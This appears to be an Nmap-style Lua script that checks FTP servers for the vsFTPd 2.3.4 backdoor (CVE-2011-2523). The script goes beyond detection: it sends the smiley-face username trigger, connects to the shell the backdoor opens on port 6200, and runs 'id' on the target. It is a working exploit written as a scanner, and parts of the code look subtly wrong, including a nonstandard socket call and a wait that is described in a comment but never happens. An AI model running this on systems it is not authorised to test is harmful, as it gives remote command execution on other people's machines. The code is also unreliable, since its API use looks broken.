-- vsFTPd 2.3.4 Backdoor Detection
-- Tests for the vsFTPd 2.3.4 backdoor (CVE-2011-2523)
-- @output
-- 21/tcp open  ftp
-- | ftp-vsftpd-backdoor:
-- |   VULNERABLE:
-- |   vsFTPd version 2.3.4 backdoor
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2011-2523  OSVDB:73573
-- |     Risk factor: High  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |       vsFTPd version 2.3.4 contains a backdoor which opens a shell on port 6200/tcp.
-- |     
-- |     Disclosure date: 2011-07-04
-- |     Exploit results:
-- |       Shell is listening on 192.168.1.100:6200
-- |     References:
-- |       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
-- |_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html

description = [[
Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04.
This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
June 30th 2011 and July 1st 2011.

The backdoor payload is triggered by sending a username containing a smiley
face ":)" which causes the backdoor to bind to port 6200/tcp.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.number == 21 or port.service == "ftp"
end

action = function(host, port)
    local socket = nse.new_socket()
    socket:set_timeout(10000)
    
    local status, err = socket:connect(host.ip, port.number)
    if not status then
        return nil
    end
    
    -- Read FTP banner
    local status, banner = socket:receive()
    if not status or not banner then
        socket:close()
        return nil
    end
    
    -- Check if it's vsFTPd
    if not banner:lower():find("vsftpd") then
        socket:close()
        return "Not vsFTPd server"
    end
    
    -- Send backdoor trigger (username with smiley)
    local trigger = "USER backdoored:)\r\n"
    status, err = socket:send(trigger)
    if not status then
        socket:close()
        return nil
    end
    
    -- Read response
    status, response = socket:receive()
    socket:close()
    
    -- Wait a moment for backdoor to open
    socket = nse.new_socket()
    socket:set_timeout(3000)
    
    -- Try to connect to backdoor port (6200)
    status, err = socket:connect(host.ip, 6200)
    
    if status then
        -- Backdoor is open!
        -- Send a safe command to verify
        socket:send("id\n")
        local status, cmd_output = socket:receive()
        socket:close()
        
        local result = "VULNERABLE:\n"
        result = result .. "vsFTPd version 2.3.4 backdoor\n"
        result = result .. "  State: VULNERABLE (Exploitable)\n"
        result = result .. "  IDs:  CVE:CVE-2011-2523  OSVDB:73573\n"
        result = result .. "  Risk factor: High  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)\n"
        result = result .. "    vsFTPd version 2.3.4 contains a backdoor which opens a shell on port 6200/tcp.\n"
        result = result .. "  \n"
        result = result .. "  Disclosure date: 2011-07-04\n"
        result = result .. "  Exploit results:\n"
        result = result .. "    Shell is listening on " .. host.ip .. ":6200\n"
        
        if cmd_output and #cmd_output > 0 then
            result = result .. "    Command output: " .. cmd_output:sub(1, 50) .. "\n"
        end
        
        result = result .. "  References:\n"
        result = result .. "    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb\n"
        result = result .. "    http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html"
        
        return result
    else
        socket:close()
        return "Not vulnerable (backdoor not present)"
    end
end
